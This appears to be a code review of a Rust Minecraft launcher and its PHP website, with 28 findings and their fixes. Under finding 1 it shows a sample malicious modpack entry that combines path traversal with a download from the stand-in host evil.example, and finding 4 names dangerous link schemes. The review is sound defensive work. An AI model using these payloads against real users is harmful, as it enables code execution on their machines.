# Lodestone code review

Date: 2026-11-07. Reviewed commit: `01d5d49` (`master`). The fixes are committed on the branch `review-fixes`, which was cut from `master`. `master` itself is unchanged.

## Status after the fixes

Every finding has a change in the working tree. Four still need a decision or work from you, and they are marked **Open**.

| # | Status | What changed | What is still open |
|---|--------|--------------|--------------------|
| 1 | Fixed | `platforms/src/paths.rs` refuses unsafe paths and the parsers use it (`.mrpack`, FTB, ATLauncher, Technic, CurseForge). The gui's modpack stage checks every path before it downloads. `.mrpack` mirrors must be HTTPS. | None |
| 2 | Fixed | `lodestone_net::download` checks the status, streams into a part file, checks size and SHA-1, then renames. The gui and loaders use it, and piston-mc's download calls are gone. | `simple_download_utility` is still used for its `DownloadProgress` type. Its own bug (no status check) remains in that crate, which is a crates.io dependency and not in this repo. |
| 3 | Fixed | `Preferences::update` runs every change under one lock, with an atomic write. A corrupt file is moved aside (`*.corrupt-<time>`), not overwritten. | None |
| 4 | Fixed | `open_source` opens only `http` and `https`. `mailto:` links are refused too. | None |
| 5 | Fixed | Microsoft accounts are keyed by UUID. Accounts from before this change take the UUID at their next sign-in. | None |
| 6 | Partly fixed | `credentials.json` is created owner-only and written atomically. A corrupt file is moved aside. | **Open:** the refresh tokens are still plain text on disk. Moving them to the OS keyring needs a new dependency and a decision from you. |
| 7 | Partly fixed | `lodestone_updater::signature` verifies a minisign (Ed25519) signature on `SHA256SUMS.txt`, with tests. | **Open:** `crates/updater/release.pub` is empty, so no key is trusted yet. You need to generate the key, put the public half in that file, and sign the checksums in `release.yml`. macOS and Windows identity checks are not implemented, because the repo does not sign those builds. |
| 8 | Fixed | The launcher's pipe is bounded end to end. Output is sent in batches, and a dropped consumer no longer stops the pipe reader. | None |
| 9 | Fixed | Mojang fetches use the launcher's client and its timeout. The pre-launch hook has a five-minute deadline and stops when its launch is dropped. The installer has a 30-minute deadline. A custom proxy that cannot be used shows a hint on the Settings page. | None |
| 10 | Fixed | The auth probe runs only on the sign-in and Settings pages. The speed clock runs only while the Settings page is open or bytes are moving. The comment about the update check now says 30 minutes. | None |
| 11 | Fixed | The installer, the `java -version` probe and the pre-launch hook run without a console window on Windows. The hook uses `cmd /S /C` with raw quoting. The Windows-only code is not compiled on macOS, so it is checked only when CI runs on Windows. | None |
| 12 | Fixed | The login and password-change limits count an attempt before the check. A successful attempt gives its count back. `TRUSTED_PROXIES` enables reading `X-Forwarded-For`, and it is off by default. | **Open:** the per-email lockout that lets someone lock out a known account is unchanged. Softening it needs a product decision, such as an unlock email. PHPUnit and MySQL were not available here, so the PHP tests were not run. |
| 13 | Fixed | The database is opened from connection options with WAL and a busy timeout. A failed open shows an alert with the path. | None |
| 14 | Fixed | The socket is claimed by holding a file lock, and the socket name uses a stable hash. The socket goes in the runtime folder when there is one. | None |
| 15 | Fixed | A switch names the account it is for, not its index. A second switch waits while one login is running. | None |
| 16 | Fixed | The library keeps its visible list and recomputes it only when the instances, the installs, the search or the filter change. | None |
| 17 | Fixed | The name sort lowers each name once. | None |
| 18 | Fixed | The download engine counts bytes with two counters, so a report costs the same however many files there are. | None |
| 19 | Fixed, with a cost | When the integrity check is on (the default), each file is checked against its SHA-1 as well as its size. This runs on launch, across all cores. Large asset sets add time to each launch. The existing "skip integrity check" setting turns it off. | Hashing on every launch may be slow on hard disks. A cache keyed on size and modification time would remove most of that cost. |
| 20 | Fixed | Technic file names come from the URL path, without the query string. | None |
| 21 | Fixed | A missing token lifetime no longer means "expired now". The Minecraft token's lifetime decides instead. | None |
| 22 | Fixed | The clock read uses `unwrap_or_default` and does not panic. | None |
| 23 | Partly fixed | `opt-level` is 3 and the release profile unwinds. A panic writes `logs/crash-<time>.txt`. A CI workflow runs formatting, clippy with `-D warnings` and the tests on three systems. `rust-toolchain.toml` pins 1.97.1. | The release binary is larger. **Open:** the doc says builds run in Docker, but the `justfile` runs `cargo` directly. Only you can decide which one is right, so I did not change either. |
| 24 | Fixed | `Session`, `StoredMicrosoft` and the device code print with their tokens redacted. | None |
| 25 | Fixed | Pid files, the news cache, uploaded art, the crash report, modpack JSON, version JSON and the install markers are written atomically. | None |
| 26 | Fixed | `t_with` fills each placeholder in one pass, so a value is never filled in again. | None |
| 27 | Fixed | Zip entries are capped by their declared size and ratio (`lodestone_fs::copy_entry`). The `.lodestone` tar-in-xz reader is capped at 100 times its compressed size. | None |
| 28 | Fixed | The lock table holds weak references and drops entries that are no longer in use. | None |

Also done while fixing: the three clippy warnings, the unused preference removal, and the Java runtime file names, which are checked for containment.

## Verification

Run on macOS (Darwin 25.6, rustc 1.97.1) against the committed tree:

- `cargo fmt --all -- --check`: clean.
- `cargo clippy --workspace --all-targets -- -D warnings`: clean. The only notice is the upstream `block v0.1.6` future-incompatibility warning from iced's wgpu chain.
- `cargo test --workspace`: 1,311 passed, 0 failed, 3 ignored. The ignored test downloads a Java runtime from Mojang.
- `php -l` on every PHP file changed: no syntax errors.

Not verified, so treat these as open until someone runs them:

- **PHP tests.** PHPUnit is not installed in `website/vendor`, and no MySQL is listening on port 13006. The rate-limit change in `AuthService` and the new `ClientIpTest` have not run. The `ClientIp` range logic was checked with a standalone script (11 cases pass).
- **Windows-only code.** The `cfg(windows)` paths (installer flags, `cmd /S /C` quoting for hooks, `java -version` creation flags) compile only on Windows. The new CI workflow builds them on `windows-latest`.
- **GUI run.** The launcher was not started, so the database, single-instance and crash-report paths have only been checked by compilation and unit tests.
- **CI.** `.github/workflows/ci.yml` has not run on GitHub yet, and the first run may need small fixes.
- **Release key.** The updater trusts no key yet; see finding 7.

## Scope and method

I read the code by hand, tracing data from where it enters (network, modpack files, user settings) to where it is written or run. I also ran:

- `cargo clippy --workspace --all-targets`: three warnings, listed in [Tooling](#tooling-and-build).
- `cargo test --workspace`: every suite passes (1,014 gui tests and about 190 in the other crates, 3 ignored).

What I covered:

- **Rust crates:** `launcher`, `auth`, `net`, `loaders`, `platforms`, `updater`, `server`, `export`.
- **gui crate (63k lines):** the parts that touch the network, disk, processes and credentials, plus the main update and subscription paths.
- **Your own dependencies:** `simple_download_utility` and `piston-mc`, because several findings start there.
- **Website:** the PHP API, checked for authentication, rate limiting, cookies, SQL and webhook handling.

Most of the 63k-line view code I only sampled, so this report doesn't list every UI-level issue.

Overall the codebase is in good shape. There are almost no `unwrap`s, blocking IO is kept off the UI thread, the comments are thorough, the tests are wide, and the website API is careful. The problems below are mostly at the trust boundaries (untrusted modpacks, links and downloads) and in the persistence of small JSON files.

Severity scale: **Critical** (security or data loss that can be triggered from outside), **High** (likely to corrupt data or break real users), **Medium** (a real bug or notable inefficiency with limited reach), **Low** (polish, robustness, minor performance).

---

## Summary table

| # | Severity | Area | Finding |
|---|----------|------|---------|
| 1 | Critical | Modpack install | Modpack file paths are joined unchecked, so a pack can write anywhere on disk |
| 2 | High | Downloads | The download engine saves HTTP error pages as files and writes in place, so broken files count as "present" |
| 3 | High | Preferences | Racing read-modify-write plus non-atomic writes can reset every preference, including the data folder |
| 4 | High | Links | Links from mod readmes and changelogs open with any URL scheme (`file://`, protocol handlers) |
| 5 | High | Accounts | Microsoft accounts are keyed by player name, so a rename leaves duplicates and a spent refresh token |
| 6 | High | Credentials | `credentials.json` is written non-atomically, is readable by others for a moment, and is wiped if corrupt |
| 7 | Medium-High | Updater | Updates are checked only against a checksum file from the same release, with no signature or code-sign check |
| 8 | Medium | Game output | The output bridge is unbounded, sends one message per log line, and stops draining when its consumer drops |
| 9 | Medium | Network | No timeouts on several requests and child processes; the proxy setting is bypassed in several places |
| 10 | Medium | Idle cost | A 15 s Microsoft probe and a 1 s full-update tick run all session long |
| 11 | Medium | Windows | Console windows flash for `java -version`, the Forge installer and hooks; `cmd /C` quoting is wrong |
| 12 | Medium | Website | The login rate limiter checks before it counts, so a parallel burst gets past it |
| 13 | Medium | Database | A failed database open only logs a warning; the connection URL is built from a raw path |
| 14 | Low-Medium | Single instance | There is a race between the connect and bind steps; the socket name hash isn't stable across builds |
| 15 | Low-Medium | Accounts | An account switch applies to an index captured before an async login finishes |
| 16-28 | Low | Various | Performance, robustness and polish (see below) |

---

## Critical

### 1. Modpack file paths are joined unchecked, so a pack can write anywhere on disk

**Where**

- [install/modpack.rs:135](crates/gui/src/app/install/modpack.rs:135): `path: game_dir.join(&file.path)`
- Where the paths come from:
  - [platforms/src/modpack/mrpack.rs:95](crates/platforms/src/modpack/mrpack.rs:95): `files[].path` from `modrinth.index.json`, passed through untouched.
  - [platforms/src/ftb.rs:268](crates/platforms/src/ftb.rs:268) and [ftb.rs:336](crates/platforms/src/ftb.rs:336): `file.path`. `trim_start_matches("./")` doesn't strip `../`.
  - [platforms/src/atlauncher.rs:298](crates/platforms/src/atlauncher.rs:298): `format!("{folder}/{file}")` with `file` from the pack JSON.
  - The platform `download` helpers do the same with `into.join(&file.name)`: [modrinth.rs:578](crates/platforms/src/modrinth.rs:578), [curseforge.rs:578](crates/platforms/src/curseforge.rs:578), [technic.rs:278](crates/platforms/src/technic.rs:278), [ftb.rs:272-274](crates/platforms/src/ftb.rs:272).

**Problem.** Archive extraction is guarded properly: `Component::Normal` checks in `extract` and `extract_overrides`, and `enclosed_name` for world zips. The list of files a pack downloads isn't guarded at all. `Path::join` with `..` walks out of the instance, and `join` with an absolute path replaces the base entirely.

**Failure scenario.** A user imports an `.mrpack` (Import dialog, drag and drop, or a Discover modpack whose index was tampered with) containing:

```json
{ "path": "../../../../.config/autostart/x.desktop", "downloads": ["https://evil.example/x"], ... }
```

or `"path": "/Users/<name>/Library/LaunchAgents/x.plist"`. The launcher creates the parent folders ([modpack.rs:155-163](crates/gui/src/app/install/modpack.rs:155)) and downloads the payload there. That's code execution at next login. Other launchers have shipped CVEs for this exact class of bug in `.mrpack` handling.

**Related.** The `downloads` URLs are also unrestricted (any host, plain `http://`, LAN addresses). The Modrinth pack format limits them to an allowlist of hosts (`cdn.modrinth.com`, `github.com`, `raw.githubusercontent.com`, `gitlab.com`).

**Fix**

- Add one helper, e.g. `fn contained(base: &Path, relative: &str) -> Option<PathBuf>`, that rejects empty paths, absolute paths, prefixes (`C:`), `RootDir`, `ParentDir` and `CurDir`, and accepts only `Component::Normal`. On every OS, also reject backslashes and drive letters inside a component.
- Use it everywhere an untrusted relative path meets a base: `modpack.rs::stage`, the platform `download` functions, and `ModpackFile` construction (fail the parse there, so the error says which entry is bad).
- Enforce the Modrinth host allowlist for `.mrpack` files, and require `https`.
- Add tests with `../`, absolute, `C:\`, `\\server\share` and `mods/../../x` entries.

---

## High

### 2. The download engine saves HTTP error pages as files and writes in place, so broken files count as "present"

**Where**

- `simple_download_utility` 0.1.1 (your crate), `download_file_with_client`: `client.get(url).send().await?` with no `error_for_status()`. It writes with `File::create(path)` straight to the final path.
- [install/download.rs:116-121](crates/gui/src/app/install/download.rs:116): `is_present` treats any non-empty file as present when the item has no size.
- `lodestone_loaders::http::fetch` ([loaders/src/http.rs:76](crates/loaders/src/http.rs:76)) gets the `.part`-then-rename step right, but still takes a 404 body as success.

**Problem**

1. A 403, 404 or 5xx response (CDN outage, a removed Forge universal jar, a rate-limited mirror, a captive portal) is written as the jar or asset.
2. For items with a SHA-1, validation catches it, but the bad file stays at the final path.
3. For items without a SHA-1 or size, such as many Fabric/Quilt/maven libraries, modpack files from ATLauncher or Technic, and Forge installer and universal jars, the error page is accepted. Every later `is_present` check then reports it as present.
4. An interrupted download of a size-less item has the same effect, because the final file is written in place.

**Failure scenario.** A transient 503 from a maven mirror during a Fabric install writes a 1 KB HTML page as `fabric-loader-x.jar`. Every later launch skips it, because it's non-empty and has no size to compare, and the game dies with `ZipException: zip END header not found`. The only fix is to delete the libraries folder by hand.

**Fix (in `simple_download_utility`)**

- Call `response.error_for_status()?`.
- Write to `<path>.part`, verify the hash when one is given, then rename.
- Delete the `.part` file on any failure.
- When the response has a `Content-Length` and the item a size, check that the two match.

**Fix (in Lodestone).** Offer a "Repair instance" action that re-hashes every item that has a SHA-1. `missing_when(verify)` only compares sizes today.

### 3. Racing read-modify-write plus non-atomic writes can reset every preference, including the data folder

**Where.** `Preferences::load()` → change one field → `store()` happens independently in [update.rs:517](crates/gui/src/app/update.rs:517) (settings), [update.rs:543](crates/gui/src/app/update.rs:543) (language), [discover.rs:703](crates/gui/src/app/discover.rs:703) and [discover.rs:730](crates/gui/src/app/discover.rs:730) (Discover view and source), [data_folder.rs:177](crates/gui/src/app/data_folder.rs:177) and [import/launcher/mod.rs:218](crates/gui/src/app/import/launcher/mod.rs:218). Each runs on its own blocking-pool thread. `store_to` is a plain `std::fs::write` ([preferences.rs:74](crates/gui/src/app/preferences.rs:74)), and `load_from` silently returns `Default` for a file it can't parse ([preferences.rs:55-66](crates/gui/src/app/preferences.rs:55)).

**Problem**

1. **Lost updates.** Two writers that overlap both load the old file, and the last one to write discards the other's change. For example, change the language while a settings save is running.
2. **Total reset.** `fs::write` truncates the file first. A concurrent `load` that reads the truncated or half-written file gets `Default`, then that writer stores the defaults plus its one field.
3. **Effect of the reset.** It erases `data_folder`, `launcher_folders`, `instance_defaults`, the Java and memory defaults, and the rest. On the next start, boot resolves the default data root, the library shows **no instances**, and the user believes their worlds are gone.

**Fix**

- Make preferences one owned value in the model, as credentials already are.
- Route every change through a single `KeyedWriter`/`CredentialWriter`-style serial writer that writes a full snapshot.
- Write atomically: write to `preferences.json.tmp`, `sync_all`, rename over the original. Windows needs `MoveFileExW(MOVEFILE_REPLACE_EXISTING)`, which `std::fs::rename` already uses.
- When parsing fails, rename the bad file to `preferences.json.corrupt-<ts>` instead of overwriting it. Then a reset can be recovered.

### 4. Links from mod readmes and changelogs open with any URL scheme

**Where.** [instances.rs:507](crates/gui/src/app/instances.rs:507) (`open_source` → `open::that_detached(&url)`), reached from:

- the resource page's readme, changelog and sidebar links ([pages/resource/mod.rs:296](crates/gui/src/app/pages/resource/mod.rs:296) → [resource.rs:69](crates/gui/src/app/resource.rs:69));
- news links ([news/mod.rs:46-49](crates/gui/src/app/news/mod.rs:49));
- the updater changelog ([updater/mod.rs:249](crates/gui/src/app/updater/mod.rs:249));
- Discover ([discover.rs:371](crates/gui/src/app/discover.rs:371)).

**Problem.** Readmes and changelogs are written by whoever uploads the project to Modrinth or CurseForge. `open::that_detached` passes the URL to `ShellExecuteW`, `open` or `xdg-open`, which all accept any scheme. Only the news *feed* filters for `http(s)` ([news/feed.rs:64](crates/gui/src/app/news/feed.rs:64)); links inside article bodies don't.

**Failure scenario.** A mod page contains `[Download the config tool](file:///C:/Users/Public/Downloads/tool.exe)` or a link to a registered protocol handler (`ms-msdt:`, `search-ms:`, vendor URI handlers). One click from the user executes or opens it. On Linux, `xdg-open` with a `file://` link to a `.desktop` file is similar.

**Fix.** Parse with `url::Url` inside `open_source`. Allow only `https` (plus `http` and `mailto` if wanted), and log and drop everything else. Every caller goes through `open_source`, so one check covers them all. `reveal_folder` and the screenshot/notification `open::that` calls take local paths the launcher built itself, so those are fine.

### 5. Microsoft accounts are keyed by player name, so a rename leaves duplicates and a spent refresh token

**Where.** `StoredAccount::is` compares `username` ([storage.rs:50](crates/gui/src/app/storage.rs:50)); `replace_refresh_token(&session.profile.name, …)` ([auth.rs:277](crates/gui/src/app/auth.rs:277)); `keep_session` → `add_and_make_primary` ([games.rs:515-523](crates/gui/src/app/games.rs:515)).

**Problem.** Minecraft names can change. The project's own notes say a refresh token is single-use. After a rename:

- `account_switched` can't find the stored account by its new name, so it doesn't replace the spent token. The stored entry keeps the dead token, and the next switch or restart fails with `invalid_grant`.
- `keep_session` (after a launch-time refresh) doesn't find a match either, so it **appends a second account** and leaves the old entry with its spent token.

**Fix.** Store the profile UUID (`session.profile.id`) in `StoredMicrosoft`, match on it, and refresh `username` from each new session. Migrate old entries by filling the UUID on their next successful login.

### 6. `credentials.json` is written non-atomically, is readable by others for a moment, and is wiped if corrupt

**Where.** [storage.rs:108-117](crates/gui/src/app/storage.rs:108) and [storage.rs:229](crates/gui/src/app/storage.rs:229).

**Problem**

1. `std::fs::write` creates the file with the default umask (usually 0644), then `restrict_permissions` sets 0600. For a moment the refresh tokens are readable by any local user. The `chmod` result is also ignored.
2. A crash or power loss during the write leaves a truncated file. `load_from` then logs "corrupt" and returns an empty store, and the next save overwrites the evidence. Every account is signed out with no way back.

**Fix.** Create the temporary file with `OpenOptions::new().write(true).create_new(true).mode(0o600)` (Unix), write, `sync_all`, rename over the original. On a parse failure, keep a `.corrupt` copy. The known limitation (plain-text tokens) still stands; the `keyring` crate would cover all three OSes when you get to it.

---

## Medium

### 7. Updates are checked only against a checksum file from the same release

**Where.** [updater/src/download.rs:16-36](crates/updater/src/download.rs:16), [install.rs:16](crates/updater/src/install.rs:16), [apply.rs:69](crates/updater/src/apply.rs:69).

**Problem.** `SHA256SUMS.txt` comes from the same GitHub release as the asset. It protects against corruption in transit, not against someone who can publish a release (a stolen token, or a compromised CI secret). Nothing else checks the update before it runs:

- **Windows:** the setup then runs **elevated and silently** (`runas`, `/S`), with no Authenticode check.
- **macOS:** the new bundle replaces the old one without `codesign --verify --deep --strict` or `spctl --assess`.
- **Linux:** only the ELF magic is checked.

**Fix**

- Sign `SHA256SUMS.txt` with a minisign/ed25519 key whose public key is embedded in the binary, and verify the signature before trusting any hash.
- On macOS, also require that the new bundle's code signature passes and that its Team ID matches the running app's.
- On Windows, call `WinVerifyTrust` on the setup and compare its signer with the running exe's.

### 8. Game output: an unbounded bridge, one message per line, and a drain that stops

**Where.** [launch/games.rs:408-427](crates/gui/src/app/launch/games.rs:408) and [launcher/src/process.rs:141](crates/launcher/src/process.rs:141).

**Problem**

1. `lodestone_launch` uses a bounded channel (1024) on purpose, as backpressure. `pump` copies it into a `tokio::sync::mpsc::unbounded_channel` on a fresh thread, which removes that guarantee. If the iced runtime falls behind (window minimised, slow frames), memory grows without limit.
2. Each line becomes its own `GameMessage::Output`. Each one runs a full `update`: the root dispatcher, `sync_art` on the Library page (which rebuilds `visible()` and the art key set), and then a view rebuild and redraw. A modded game at startup prints thousands of lines a second, and that load lands on the UI thread.
3. In `drain`, when `events.send` fails because the receiver was dropped, the thread `break`s and **stops reading the pipe**. The JVM then blocks on its next write once the 64 KB pipe buffer fills, which freezes the game. That is the deadlock the module's own header warns about. Today the receiver lives as long as the pump, so this is latent, but any future change that drops the pump (an aborted task, say) would freeze the game.

**Fix**

- Keep the bounded channel all the way through, using `tokio::sync::mpsc::channel(1024)` with `blocking_send` on the bridge thread.
- In `pump`, batch: collect lines for about 16-50 ms or up to N lines, and send one `GameMessage::Output { lines: Vec<…> }`.
- In `drain`, keep reading and discard lines after the receiver has gone, instead of breaking.

### 9. No timeouts on several requests and child processes; the proxy setting is bypassed

**Requests with no timeout that ignore the proxy setting**

- `piston_mc::ManifestV2::fetch` calls `reqwest::get(PISTON_URL)` with **no timeout** and its own client. It's called from [install/ensure.rs:53](crates/gui/src/app/install/ensure.rs:53), [install/catalog.rs:39](crates/gui/src/app/install/catalog.rs:39) and [catalog.rs:63](crates/gui/src/app/install/catalog.rs:63), and [loaders/src/vanilla.rs:43-63](crates/loaders/src/vanilla.rs:43). `JavaManifest::fetch` ([install/java.rs:53](crates/gui/src/app/install/java.rs:53)) and `version_manifest.rs` (`Client::new()`) work the same way.
- `lodestone_loaders::http::fetch` → `simple_download_utility::download_file`, which builds a **new `reqwest::Client::new()` for every file**: no proxy, no timeout, no connection reuse. Loader library downloads run 64 at a time ([loaders/src/http.rs:44](crates/loaders/src/http.rs:44)), so that's up to 64 fresh TLS handshakes in parallel per install.

**Child processes with no timeout**

- Pre-launch hook ([launch/prepare.rs:479](crates/gui/src/app/launch/prepare.rs:479)): `.status()` inside `spawn_blocking`. A hook that never exits leaves the instance "Preparing" forever. Aborting the task doesn't kill the child.
- Forge/NeoForge installer ([loaders/src/install.rs:156](crates/loaders/src/install.rs:156)): it's killed only when the progress channel closes. If no channel is given, it can't be stopped.

**Proxy behaviour**

- `lodestone_net::builder` drops an unparsable custom proxy without a word (`.ok()`, [net/src/lib.rs:51](crates/net/src/lib.rs:51)) and connects directly. A user who set a proxy for privacy gets a direct connection instead. Return an error the Settings page can show.
- `lodestone_net::client()` falls back to `reqwest::Client::new()` if the build fails. That also drops the proxy, with no log line.

**Fix**

- Give piston-mc and `simple_download_utility` `*_with_client` entry points that take `&reqwest::Client`, and always pass `lodestone_net::client()`.
- Wrap the hook and the installer in a deadline: poll `try_wait` and kill on expiry or cancellation, like the installer's loop already does.

### 10. A 15 s Microsoft probe and a 1 s full-update tick run all session long

**Where.** [subscription.rs:23-24](crates/gui/src/app/subscription.rs:23).

**Problem**

- `AuthProbeTick` makes a request to `login.microsoftonline.com` every 15 seconds for the whole session, not only on the sign-in page. That's 5,760 requests a day. It also writes an `info!` line to `latest.log` every time ([update.rs:415](crates/gui/src/app/update.rs:415)), which fills the logs and wakes the radio on laptops.
- `SpeedTick` fires every second even when nothing is downloading. Each tick is a full `update` and redraw of the window, so the app never really goes idle and uses CPU and battery.
- Minor: the comment at line 29 says "every couple of minutes", but `CHECK_EVERY` is 30 minutes.

**Fix**

- Subscribe to the probe only while `Page::Login` is shown, or when a status indicator that needs it is on screen, and log at `debug`.
- Subscribe to `SpeedTick` only while a download, install or job is active.

### 11. Windows: console windows flash, and `cmd /C` quoting is wrong

**Where.** The release build uses `windows_subsystem = "windows"`, so any console child gets its own console window unless it's spawned with `CREATE_NO_WINDOW`. Only the game launch sets that flag ([launcher/src/process.rs:70](crates/launcher/src/process.rs:70)). These don't:

- `java -version` while looking for a system Java ([install/java.rs:262](crates/gui/src/app/install/java.rs:262)). It runs once per `java.exe` on `PATH`, so several windows flash.
- The Forge/NeoForge installer `java -jar` ([loaders/src/install.rs:156](crates/loaders/src/install.rs:156)). A console stays open for the whole install.
- The pre-launch hook `cmd /C` ([launch/prepare.rs:481](crates/gui/src/app/launch/prepare.rs:481)).

**Quoting bug.** `Command::arg` quotes arguments for the MSVC runtime (backslash-escaped `"`), and `cmd.exe` doesn't follow those rules. A hook such as `"C:\Program Files\Tool\tool.exe" --flag "x y"` comes out wrong. Use `std::os::windows::process::CommandExt::raw_arg(&command)` for the `cmd /C` case.

**Related bug.** `parse_major` ([install/java.rs:268](crates/gui/src/app/install/java.rs:268)) reads only the first line of `-version`. When `JAVA_TOOL_OPTIONS` or `_JAVA_OPTIONS` is set, that line is "Picked up JAVA_TOOL_OPTIONS: …", the parse fails, and the zlib-ng Forge fallback never finds a system Java. Search for the first line that contains `version "`.

### 12. The login rate limiter checks before it counts

**Where.** [website/api/lib/Auth/AuthService.php:200-204](website/api/lib/Auth/AuthService.php:200), with the hit recorded at [482-483](website/api/lib/Auth/AuthService.php:482). The same pattern appears at 354-365 (change password).

**Problem.** `isBlocked` (SELECT) runs first, then the password hash is checked (slow by design, around 100 ms or more), then `hit` (UPSERT) runs. N parallel requests in one window all pass `isBlocked` before any of them records a hit, so the per-email and per-IP limits don't hold up against a parallel brute force. The fixed window also allows twice the limit across a window boundary.

**Fix.** Record the attempt *first*, with the atomic `hit()` that already returns the count, and refuse when `count > limit`. Then clear the bucket on success, as the code already does. Consider a sliding window or two overlapping windows.

**Two deployment notes**

- `ClientIp` uses only `REMOTE_ADDR`. Behind Cloudflare or another reverse proxy, every client shares one IP and the IP bucket locks everyone out together. Trust `X-Forwarded-For` only from configured proxy addresses.
- The per-email bucket lets anyone lock a known account out of password login. That's a common trade-off; an emailed unlock link or a CAPTCHA after N failures softens it.

### 13. A failed database open only logs a warning; the connection URL is built from a raw path

**Where.** [update.rs:324-327](crates/gui/src/app/update.rs:324) and [database.rs:53](crates/gui/src/app/database.rs:53).

**Problem**

1. When `Database::connect` fails (a locked file, a failed migration after a downgrade, a full disk), the root only logs `warn!`. The library just looks empty, and installs and edits fail later with unrelated errors. Show a blocking alert that names the database path and gives the error.
2. The URL `format!("sqlite://{}?mode=rwc", path.display())` breaks for paths that contain `?`, `#` or `%`. Portable folders and user names can contain those. Use `SqliteConnectOptions::new().filename(&path).create_if_missing(true)`, which also makes it easy to set `journal_mode(Wal)`, `synchronous(Normal)` and an explicit `busy_timeout`. A 4-connection pool against a rollback journal can hit `SQLITE_BUSY` under concurrent writes (the keyed writers plus notifications plus record writes).

### 14. Single instance: a race between connect and bind, and an unstable socket name

**Where.** [single_instance.rs:106-116](crates/gui/src/app/single_instance.rs:106) and [single_instance.rs:100](crates/gui/src/app/single_instance.rs:100).

**Problem**

1. Two launchers started at the same moment (a double-click, or autostart plus a manual start) can both fail `connect`. Then A binds, B `remove_file`s A's socket and binds its own. Both run against the same database and pid folder, and A's listener can no longer be reached. Take an exclusive lock first (`flock`/`fs2` on a `launcher.lock`) and use the socket only for the "show" message.
2. `DefaultHasher` isn't guaranteed to be stable across Rust releases, so two builds of the launcher can compute different socket names in the temp folder. This only matters for long portable paths.
3. On Linux, `/tmp` is shared, so another local user can pre-bind `lodestone-<hash>.sock`. That's a minor local denial of service. Prefer `$XDG_RUNTIME_DIR`.

### 15. An account switch applies to an index captured before an async login

**Where.** [auth.rs:240-290](crates/gui/src/app/auth.rs:240).

**Problem.** `switch_account(index)` starts an async refresh and later calls `make_primary(index)` / `AccountSwitched(index, …)`. If the user removes an account earlier in the list while the login is running, the index now points at a different account. That account becomes primary, but it's displayed with the other account's session. Two clicks on the same account start two refreshes with the same single-use token, and the second fails and shows a warning even though the first succeeded.

**Fix.** Carry the account's identity (the UUID, see #5) in the message instead of an index, and ignore a switch request while one is already running.

---

## Low: robustness, performance and polish

16. **Library recomputes its visible list twice per update and frame.** `Library::visible()` ([pages/library/mod.rs:315](crates/gui/src/app/pages/library/mod.rs:315)) lowercases every name, filters and sorts. It's called from `instances_list` (view) and from `art_keys` (after **every** message on Home, through `sync_art`, [update.rs:50](crates/gui/src/app/update.rs:50)). The Worlds page already caches its result in `refilter()`; do the same here and recompute only when instances, the search query or the filter change.

17. **Sort by name allocates in the comparator.** [pages/worlds/filters.rs:101](crates/gui/src/app/pages/worlds/filters.rs:101) calls `to_lowercase()` twice per comparison, which is O(n log n) allocations. Use `sort_by_cached_key`, or store a lowercase key on `WorldEntry`.

18. **`simple_download_utility` progress costs grow with the square of the file count.** For every chunk of every file, the progress task takes a mutex, sums `file_progress` over *all* files, and clones `file_names` and `file_names_downloaded` (`Vec<String>` of every file) into a `MultiDownloadProgress`. An asset download is about 4,000 objects, which adds up to millions of string clones. Send counters only (the names are unused here), and throttle reports to about 10 Hz.

19. **"Verify" checks only sizes.** `missing_when(verify = true)` compares sizes; it never hashes. Same-size corruption (disk errors, an antivirus quarantine stub) goes unnoticed. This ties into the Repair action suggested in #2.

20. **Technic file names come from the raw URL.** `file_name(url)` ([platforms/src/technic.rs:135](crates/platforms/src/technic.rs:135)) keeps the query string and fragment (`mod.jar?raw=true`). On Windows `?` is an illegal file-name character, so the install fails. A trailing slash gives an empty name. Parse with `url::Url` and take `path_segments().last()`, after the check from #1.

21. **A missing `expires_in` makes the session expire at once.** `token.expires_in().unwrap_or_default()` ([auth/src/lib.rs:202](crates/auth/src/lib.rs:202) and [224](crates/auth/src/lib.rs:224)) turns a missing value into 0. `session_expiry` then takes the minimum, so the session is already expired, and every launch triggers another refresh (which spends a token). Default to the Minecraft token's lifetime, or one hour.

22. **`unix_now` panics on a clock set before 1970** ([auth/src/lib.rs:496](crates/auth/src/lib.rs:496)). With `panic = "abort"` in release, that kills the app. A dead CMOS battery can do this. Use `unwrap_or_default()`.

23. **The release profile.** `opt-level = "z"` ([Cargo.toml:27](Cargo.toml:27)) optimises for size. Hashing (SHA-1/512 over assets and exports), xz at preset 9, resvg rendering and image decoding are all CPU-bound and can run noticeably slower at `z`. Benchmark `3` (or `s`) against `z` with `just profile`. `panic = "abort"` also means every `spawn_blocking(...).await.map_err(JoinError)` branch is dead code in release, and any panic, including the `expect`s in `process.rs` and the `lang` panic, takes down the whole launcher and any games it supervises. If you keep `abort`, install a panic hook that writes a crash report to the logs folder before it aborts.

24. **Secrets have `Debug` derived.** `Session` ([auth/src/session.rs:9](crates/auth/src/session.rs:9)), `StoredMicrosoft` and `StoredCredentials` all derive `Debug` and contain tokens. I found no current `{:?}` of them in a log, but one stray `debug!("{session:?}")`, or `Debug` on a message enum that carries a session, would leak a token into `latest.log`, which users attach to bug reports. Write a manual `Debug` that redacts the tokens, or wrap them in a `Secret<String>`.

25. **Small writes that are neither atomic nor serialised:** the news cache ([news/cache.rs:41-42](crates/gui/src/app/news/cache.rs:41)), pid files ([launch/pidfile.rs:83](crates/gui/src/app/launch/pidfile.rs:83)) and the debug log config ([launch/prepare.rs:464](crates/gui/src/app/launch/prepare.rs:464)). Each recovers on its own, but the `write_file` `.part`-then-rename helper already exists in `install/ensure.rs`; move it to a shared `fs_util::write_atomic` and use it for every persistent JSON write (#3 and #6 included).

26. **`t_with` substitutes placeholders inside values.** [lang/mod.rs:92](crates/gui/src/app/lang/mod.rs:92) replaces one placeholder after another, so a value that contains `{mc}` (an error message from a server, say) gets the next placeholder's value spliced in. It's cosmetic; do one pass over the template instead.

27. **Archive extraction has no size cap.** A zip or tar bomb in an imported pack can fill the disk. Consider a total-size limit, roughly 4× the archive's declared uncompressed size, and a check on the compression ratio.

28. **The `ensure::lock` table never shrinks** ([install/ensure.rs:29](crates/gui/src/app/install/ensure.rs:29)). It only holds one key per version, Java, loader and natives folder, so it's harmless, but a `Weak`-valued map, or removing the entry when its guard drops, would make it tidy.

---

## Tooling and build

- **No CI for tests or lints.** `.github/workflows` has only `release.yml` and `website.yml`. Add a workflow that runs `cargo fmt --check`, `cargo clippy --workspace --all-targets -- -D warnings` and `cargo test --workspace` on Windows, macOS and Linux for every push and PR. The cross-platform `cfg` code paths (Windows pipes, `ShellExecuteW`, the macOS bundle) aren't compiled on any machine but the one they target today.
